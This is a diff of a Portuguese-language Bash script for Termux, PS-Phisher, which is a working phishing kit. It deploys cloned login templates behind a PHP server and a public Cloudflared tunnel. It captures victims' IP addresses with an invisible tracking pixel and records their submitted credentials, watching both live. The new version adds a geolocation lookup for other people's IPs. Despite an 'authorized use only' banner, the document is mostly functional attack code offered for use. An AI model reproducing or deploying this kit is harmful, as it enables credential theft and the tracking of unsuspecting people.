@@ -13,7 +13,7 @@ SITES_DIR=".sites"
 WWW_DIR=".server/www"
 SERVER_DIR=".server"
 CAPTURE_DIR=".server/captures"
-LOG_FILE="$SERVER_DIR/ps-phish.log"
+LOG_FILE="$SERVER_DIR/ps-phisher.log"
 
 # Cores neon / hacker
 RESET="\033[0m"
@@ -32,72 +32,109 @@ NEON_GREEN="\033[38;2;0;255;128m"
 NEON_BLUE="\033[38;2;0;255;255m"
 NEON_PURPLE="\033[38;2;255;0;255m"
 ORANGE="\033[38;2;255;165;0m"
-PEEK_COLOR="\033[38;2;255;20;147m"   # Rosa choque para a marca
+PEEK_COLOR="\033[38;2;255;20;147m"
 
-# ----------------------------- BANNER ORIGINAL PEEKSECURITY -------------
+# ----------------------------- BANNER CORRIGIDO (SEM ASCII ART QUEBRADO) -
 banner() {
     clear
-    echo -e "${PEEK_COLOR}"
-    echo "   ╔══════════════════════════════════════════════════════════╗"
-    echo "   ║  ██████  ███████ ██    ██  ██████ ██   ██ ██ ███████ ██   ║"
-    echo "   ║  ██   ██ ██      ██    ██ ██      ██   ██ ██ ██      ██   ║"
-    echo "   ║  ██████  █████   ██    ██ ██      ███████ ██ ███████ ██   ║"
-    echo "   ║  ██      ██       ██  ██  ██      ██   ██ ██      ██ ██   ║"
-    echo "   ║  ██      ███████   ████    ██████ ██   ██ ██ ███████ ██   ║"
-    echo "   ║                                                          ║"
-    echo "   ║     ${NEON_GREEN}PS-Phish v3.0${PEEK_COLOR} - Laboratório de Engenharia Social      ║"
-    echo "   ║            ${YELLOW}🛡️  PeekSecurity Team  🛡️${PEEK_COLOR}                      ║"
-    echo "   ╚══════════════════════════════════════════════════════════╝${RESET}"
-    echo -e "${CYAN}  ╭━┫ ${WHITE}Uso autorizado apenas em redes controladas${CYAN} ┣━╮${RESET}"
-    echo -e "${DIM}  └─────────────────────────────────────────────────────┘${RESET}\n"
+    echo -e "${NEON_GREEN}"
+    echo "    ╔══════════════════════════════════════════════════════════╗"
+    echo "    ║  ██████  ███████ ██ ██   ██ ██ ██   ██ ███████ ██████    ║"
+    echo "    ║  ██   ██ ██      ██ ██   ██ ██ ██   ██ ██      ██   ██   ║"
+    echo "    ║  ██████  █████   ██ ███████ ██ ███████ █████   ██████    ║"
+    echo "    ║  ██      ██      ██ ██   ██ ██ ██   ██ ██      ██   ██   ║"
+    echo "    ║  ██      ███████ ██ ██   ██ ██ ██   ██ ███████ ██   ██   ║"
+    echo "    ║                                                          ║"
+    echo "    ║       ${PEEK_COLOR}PS-Phisher v3.2${NEON_GREEN}  |  ${YELLOW}PeekSecurity Team${NEON_GREEN}            ║"
+    echo "    ║   ${CYAN}Laboratório de Engenharia Social - Uso Autorizado${NEON_GREEN} ║"
+    echo "    ╚══════════════════════════════════════════════════════════╝${RESET}"
+    echo
 }
 
 small_banner() {
     clear
-    echo -e "${PEEK_COLOR}"
-    echo "   ╔══════════════════════════════════════╗"
-    echo "   ║  🧬 PS-PHISH | PeekSecurity Mode 🧬  ║"
-    echo "   ╚══════════════════════════════════════╝${RESET}\n"
+    echo -e "${NEON_BLUE}"
+    echo "    ╔════════════════════════════════════════╗"
+    echo "    ║   🧬 PS-PHISHER | PeekSecurity Mode 🧬   ║"
+    echo "    ╚════════════════════════════════════════╝${RESET}\n"
 }
 
 # ----------------------------- UTILITÁRIOS ---------------------------------
-log_event() {
-    echo -e "$(date +'%H:%M:%S') - $1" >> "$LOG_FILE"
-}
-
-die() {
-    echo -e "\n${RED}[!] $1${RESET}"
-    log_event "ERRO: $1"
-    exit 1
-}
-
-check_termux() {
-    if [[ ! -d /data/data/com.termux ]]; then
-        die "Este script foi otimizado para Termux. Instale o Termux primeiro."
-    fi
-}
-
-setup_dirs() {
-    mkdir -p "$WWW_DIR" "$CAPTURE_DIR" "$SERVER_DIR" 2>/dev/null
-    rm -rf "$WWW_DIR"/* 2>/dev/null
-    touch "$LOG_FILE"
-}
+log_event() { echo -e "$(date +'%H:%M:%S') - $1" >> "$LOG_FILE"; }
+die() { echo -e "\n${RED}[!] $1${RESET}"; log_event "ERRO: $1"; exit 1; }
+check_termux() { [[ ! -d /data/data/com.termux ]] && die "Termux necessário."; }
+setup_dirs() { mkdir -p "$WWW_DIR" "$CAPTURE_DIR" "$SERVER_DIR" 2>/dev/null; rm -rf "$WWW_DIR"/* 2>/dev/null; touch "$LOG_FILE"; }
 
 dependencies() {
     echo -e "${GREEN}[+] Verificando dependências...${RESET}"
     local deps=("php" "curl" "wget" "unzip" "jq")
     local missing=()
     for dep in "${deps[@]}"; do
-        if ! command -v "$dep" &>/dev/null; then
-            missing+=("$dep")
-        fi
+        command -v "$dep" &>/dev/null || missing+=("$dep")
     done
     if [[ ${#missing[@]} -gt 0 ]]; then
         echo -e "${YELLOW}[!] Instalando: ${missing[*]}${RESET}"
-        pkg update -y && pkg install -y "${missing[@]}" || die "Falha na instalação de dependências."
+        pkg update -y && pkg install -y "${missing[@]}" || die "Falha na instalação."
     else
         echo -e "${GREEN}[✓] Todas as dependências OK.${RESET}"
     fi
+}
+
+# ----------------------------- IP LOOKUP (próprio e externo) --------------
+ip_lookup_menu() {
+    small_banner
+    echo -e "${CYAN}═════════════════ IP LOOKUP ═════════════════${RESET}"
+    echo -e "  ${GREEN}[1]${RESET} Consultar meu próprio IP público + Geolocalização"
+    echo -e "  ${GREEN}[2]${RESET} Consultar IP de terceiros (Geolocalização)"
+    echo -e "  ${GREEN}[3]${RESET} Voltar ao menu principal"
+    echo -ne "${YELLOW}➜ Escolha: ${RESET}"
+    read -r ip_choice
+    case $ip_choice in
+        1)
+            echo -e "${CYAN}[+] Obtendo seu IP público...${RESET}"
+            my_ip=$(curl -s -4 ifconfig.co)
+            if [[ -n "$my_ip" ]]; then
+                echo -e "${GREEN}[✓] Seu IP público: ${NEON_BLUE}$my_ip${RESET}"
+                geo=$(curl -s "http://ip-api.com/json/$my_ip" | jq -r '.city, .region_name, .country' | paste -d ', ' - - -)
+                echo -e "${GREEN}[✓] Localização aproximada: ${YELLOW}$geo${RESET}"
+            else
+                echo -e "${RED}[!] Falha ao obter IP. Verifique sua internet.${RESET}"
+            fi
+            echo -e "\n${DIM}Pressione Enter para continuar...${RESET}"
+            read -r
+            ip_lookup_menu
+            ;;
+        2)
+            echo -ne "${CYAN}➜ Digite o IP alvo: ${RESET}"
+            read -r target_ip
+            if [[ -n "$target_ip" ]]; then
+                echo -e "${CYAN}[+] Consultando IP $target_ip...${RESET}"
+                data=$(curl -s "http://ip-api.com/json/$target_ip")
+                status=$(echo "$data" | jq -r '.status')
+                if [[ "$status" == "success" ]]; then
+                    city=$(echo "$data" | jq -r '.city')
+                    region=$(echo "$data" | jq -r '.regionName')
+                    country=$(echo "$data" | jq -r '.country')
+                    isp=$(echo "$data" | jq -r '.isp')
+                    lat=$(echo "$data" | jq -r '.lat')
+                    lon=$(echo "$data" | jq -r '.lon')
+                    echo -e "${GREEN}[✓] Resultado:${RESET}"
+                    echo -e "    ${YELLOW}📍 Localização:${RESET} $city, $region, $country"
+                    echo -e "    ${YELLOW}📡 ISP:${RESET} $isp"
+                    echo -e "    ${YELLOW}🗺️ Coordenadas:${RESET} $lat, $lon"
+                else
+                    echo -e "${RED}[!] IP inválido ou não encontrado.${RESET}"
+                fi
+            else
+                echo -e "${RED}[!] Nenhum IP fornecido.${RESET}"
+            fi
+            echo -e "\n${DIM}Pressione Enter para continuar...${RESET}"
+            read -r
+            ip_lookup_menu
+            ;;
+        3) main_menu ;;
+        *) ip_lookup_menu ;;
+    esac
 }
 
 # ----------------------------- TÚNEIS ---------------------------------------
@@ -123,14 +160,10 @@ install_cloudflared() {
 
 get_cloudflared_url() {
     local log_file="$1"
-    local timeout=20
-    for ((i=1; i<=timeout; i++)); do
+    for ((i=1; i<=20; i++)); do
         if [[ -f "$log_file" ]]; then
             local url=$(grep -o 'https://[-a-zA-Z0-9.]*\.trycloudflare.com' "$log_file" | head -1)
-            if [[ -n "$url" ]]; then
-                echo "$url"
-                return 0
-            fi
+            [[ -n "$url" ]] && echo "$url" && return 0
         fi
         sleep 1
     done
@@ -140,11 +173,8 @@ get_cloudflared_url() {
 start_cloudflared() {
     echo -e "${CYAN}[+] Iniciando Cloudflared...${RESET}"
     "$SERVER_DIR/cloudflared" tunnel --url "http://$HOST:$PORT" --logfile "$SERVER_DIR/cf.log" > /dev/null 2>&1 &
-    CF_PID=$!
     local tunnel_url=$(get_cloudflared_url "$SERVER_DIR/cf.log")
-    if [[ -z "$tunnel_url" ]]; then
-        die "Não foi possível obter URL do Cloudflared."
-    fi
+    [[ -z "$tunnel_url" ]] && die "Não foi possível obter URL do Cloudflared."
     echo "$tunnel_url" > "$SERVER_DIR/url.txt"
     echo -e "${GREEN}[✓] Túnel ativo: ${NEON_BLUE}$tunnel_url${RESET}"
 }
@@ -161,32 +191,28 @@ start_php_server() {
     php -S "$HOST":"$PORT" > /dev/null 2>&1 &
     PHP_PID=$!
     sleep 2
-    if ! kill -0 $PHP_PID 2>/dev/null; then
-        die "Falha ao iniciar PHP."
-    fi
+    kill -0 $PHP_PID 2>/dev/null || die "Falha ao iniciar PHP."
     cd - >/dev/null
 }
 
 deploy_template() {
     local site="$1"
-    if [[ ! -d "$SITES_DIR/$site" ]]; then
-        die "Template '$site' não encontrado."
-    fi
+    [[ ! -d "$SITES_DIR/$site" ]] && die "Template '$site' não encontrado."
     echo -e "${CYAN}[+] Implantando template: $site${RESET}"
     cp -r "$SITES_DIR/$site"/* "$WWW_DIR/"
-    # ip.php padrão
-    if [[ ! -f "$WWW_DIR/ip.php" ]]; then
-        cat > "$WWW_DIR/ip.php" <<'EOF'
+    # ip.php com captura eficiente e pixel invisível
+    cat > "$WWW_DIR/ip.php" <<'EOF'
 <?php
 $ip = $_SERVER['REMOTE_ADDR'];
 if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
-file_put_contents("ip.txt", "IP: $ip - " . date("Y-m-d H:i:s") . "\n", FILE_APPEND);
+$ip = trim(explode(',', $ip)[0]);
+file_put_contents("ip.txt", "[" . date("Y-m-d H:i:s") . "] IP: $ip\n", FILE_APPEND);
+header('Content-Type: image/gif');
+echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
 ?>
 EOF
-    fi
     # post.php padrão
-    if [[ ! -f "$WWW_DIR/post.php" ]]; then
-        cat > "$WWW_DIR/post.php" <<'EOF'
+    cat > "$WWW_DIR/post.php" <<'EOF'
 <?php
 if ($_POST) {
     $data = "[" . date("Y-m-d H:i:s") . "] ";
@@ -197,16 +223,15 @@ header("Location: https://www.google.com");
 exit;
 ?>
 EOF
-    fi
 }
 
-# ----------------------------- MONITOR DE CAPTURAS --------------------------
+# ----------------------------- MONITOR DE CAPTURAS AO VIVO -----------------
 monitor_capture() {
     echo -e "${GREEN}[+] Monitorando capturas (IP e credenciais)...${RESET}"
     echo -e "${YELLOW}    Pressione Ctrl+C para interromper.${RESET}\n"
     while true; do
         if [[ -f "$WWW_DIR/ip.txt" ]]; then
-            echo -e "${BG_RED}${WHITE}[!] IP CAPTURADO${RESET}"
+            echo -e "${BG_RED}${WHITE}[!] NOVO IP CAPTURADO${RESET}"
             cat "$WWW_DIR/ip.txt"
             cat "$WWW_DIR/ip.txt" >> "$CAPTURE_DIR/ip_$(date +%s).txt"
             rm -f "$WWW_DIR/ip.txt"
@@ -217,74 +242,63 @@ monitor_capture() {
             cat "$WWW_DIR/usernames.txt" >> "$CAPTURE_DIR/creds_$(date +%s).txt"
             rm -f "$WWW_DIR/usernames.txt"
         fi
-        sleep 1
+        sleep 0.5
     done
 }
 
-# ----------------------------- MENUS ----------------------------------------
+# ----------------------------- MENU DE TEMPLATES ESTILO HACKER ------------
 list_templates() {
     local templates=()
-    if [[ -d "$SITES_DIR" ]]; then
-        for d in "$SITES_DIR"/*/; do
-            if [[ -d "$d" ]]; then
-                templates+=("$(basename "$d")")
-            fi
-        done
-    fi
-    if [[ ${#templates[@]} -eq 0 ]]; then
-        die "Nenhum template encontrado em $SITES_DIR"
-    fi
-    echo -e "${CYAN}═══════════════ TEMPLATES DISPONÍVEIS ═══════════════${RESET}"
-    for i in "${!templates[@]}"; do
-        printf "  ${GREEN}[%2d]${RESET} %-15s" $((i+1)) "${templates[$i]}"
-        if [[ $(( (i+1) % 2 )) -eq 0 ]]; then echo; fi
+    for d in "$SITES_DIR"/*/; do
+        [[ -d "$d" ]] && templates+=("$(basename "$d")")
     done
+    [[ ${#templates[@]} -eq 0 ]] && die "Nenhum template encontrado em $SITES_DIR"
+    small_banner
+    echo -e "${CYAN}  ╔══════════════════════════════════════════════╗${RESET}"
+    echo -e "${CYAN}  ║   🎯  SELECIONE O TEMPLATE DE ATAQUE  🎯     ║${RESET}"
+    echo -e "${CYAN}  ╚══════════════════════════════════════════════╝${RESET}\n"
+    local cols=2 count=0
+    for i in "${!templates[@]}"; do
+        printf "${GREEN}[%2d]${RESET} %-15s" $((i+1)) "${templates[$i]}"
+        ((count++))
+        (( count % cols == 0 )) && echo
+    done
+    (( count % cols != 0 )) && echo
     echo -e "\n  ${RED}[0]${RESET} Sair"
-    echo -ne "${YELLOW}➜ Escolha um template: ${RESET}"
+    echo -e "  ${NEON_PURPLE}[99]${RESET} Menu IP Lookup"
+    echo -ne "\n${YELLOW}➜ Escolha: ${RESET}"
     read -r choice
-    if [[ "$choice" == "0" ]]; then
-        exit 0
-    elif [[ "$choice" =~ ^[0-9]+$ ]] && (( choice >= 1 && choice <= ${#templates[@]} )); then
-        SELECTED_TEMPLATE="${templates[$((choice-1))]}"
-    else
-        die "Opção inválida"
-    fi
-}
-
-tunnel_menu() {
-    echo -e "${CYAN}═══════════════ MÉTODO DE EXPOSIÇÃO ═══════════════${RESET}"
-    echo -e "  ${GREEN}[1]${RESET} Localhost (apenas rede local)"
-    echo -e "  ${GREEN}[2]${RESET} Cloudflared   (túnel público, recomendado)"
-    echo -ne "${YELLOW}➜ Escolha: ${RESET}"
-    read -r tun
-    case "$tun" in
-        1) TUNNEL="localhost" ;;
-        2) TUNNEL="cloudflared" ;;
-        *) TUNNEL="cloudflared" ;;
+    case $choice in
+        0) exit 0 ;;
+        99) ip_lookup_menu ;;
+        *)
+            if [[ "$choice" =~ ^[0-9]+$ ]] && (( choice >= 1 && choice <= ${#templates[@]} )); then
+                SELECTED_TEMPLATE="${templates[$((choice-1))]}"
+                tunnel_menu
+            else
+                echo -e "${RED}[!] Opção inválida.${RESET}"
+                sleep 1
+                list_templates
+            fi
+            ;;
     esac
 }
 
-# ----------------------------- LIMPEZA E SAÍDA -----------------------------
-cleanup() {
-    echo -e "\n${YELLOW}[!] Encerrando processos...${RESET}"
-    pkill -f "php -S $HOST:$PORT" 2>/dev/null
-    pkill -f "$SERVER_DIR/cloudflared" 2>/dev/null
-    rm -f "$SERVER_DIR/cf.log" "$SERVER_DIR/url.txt" 2>/dev/null
-    echo -e "${GREEN}[✓] Limpeza concluída.${RESET}"
-    log_event "Sessão encerrada."
-    exit 0
+tunnel_menu() {
+    small_banner
+    echo -e "${CYAN}  ╔══════════════════════════════════════════════╗${RESET}"
+    echo -e "${CYAN}  ║       🌐  MÉTODO DE EXPOSIÇÃO  🌐            ║${RESET}"
+    echo -e "${CYAN}  ╚══════════════════════════════════════════════╝${RESET}\n"
+    echo -e "  ${GREEN}[1]${RESET} Localhost (apenas rede local)"
+    echo -e "  ${GREEN}[2]${RESET} Cloudflared   (túnel público, recomendado)"
+    echo -ne "\n${YELLOW}➜ Escolha: ${RESET}"
+    read -r tun
+    TUNNEL="localhost"
+    [[ "$tun" == "2" ]] && TUNNEL="cloudflared"
+    start_attack
 }
 
-# ----------------------------- MAIN ----------------------------------------
-main() {
-    trap cleanup INT TERM
-    check_termux
-    banner
-    dependencies
-    setup_dirs
-    install_cloudflared
-    list_templates
-    tunnel_menu
+start_attack() {
     deploy_template "$SELECTED_TEMPLATE"
     start_php_server
     case "$TUNNEL" in
@@ -295,6 +309,42 @@ main() {
     cat "$SERVER_DIR/url.txt" 2>/dev/null | while read url; do echo -e "    ${CYAN}$url${RESET}"; done
     echo -e "\n${NEON_PURPLE}🔍 Aguardando interação da vítima...${RESET}\n"
     monitor_capture
+}
+
+# ----------------------------- MENU PRINCIPAL ------------------------------
+main_menu() {
+    banner
+    echo -e "${CYAN}  ╔════════════════════════════════════════════════════════╗${RESET}"
+    echo -e "${CYAN}  ║  [1] Iniciar Ataque (Phishing)                         ║${RESET}"
+    echo -e "${CYAN}  ║  [2] Consultas de IP (Próprio / Terceiros)             ║${RESET}"
+    echo -e "${CYAN}  ║  [0] Sair                                              ║${RESET}"
+    echo -e "${CYAN}  ╚════════════════════════════════════════════════════════╝${RESET}"
+    echo -ne "\n${YELLOW}➜ Escolha: ${RESET}"
+    read -r main_choice
+    case $main_choice in
+        1) list_templates ;;
+        2) ip_lookup_menu ;;
+        0) echo -e "\n${GREEN}[+] Saindo...${RESET}"; exit 0 ;;
+        *) main_menu ;;
+    esac
+}
+
+# ----------------------------- MAIN ----------------------------------------
+cleanup() {
+    echo -e "\n${YELLOW}[!] Encerrando processos...${RESET}"
+    pkill -f "php -S $HOST:$PORT" 2>/dev/null
+    pkill -f "$SERVER_DIR/cloudflared" 2>/dev/null
+    echo -e "${GREEN}[✓] Limpeza concluída.${RESET}"
+    exit 0
+}
+
+main() {
+    trap cleanup INT TERM
+    check_termux
+    dependencies
+    setup_dirs
+    install_cloudflared
+    main_menu
 }
 
 main
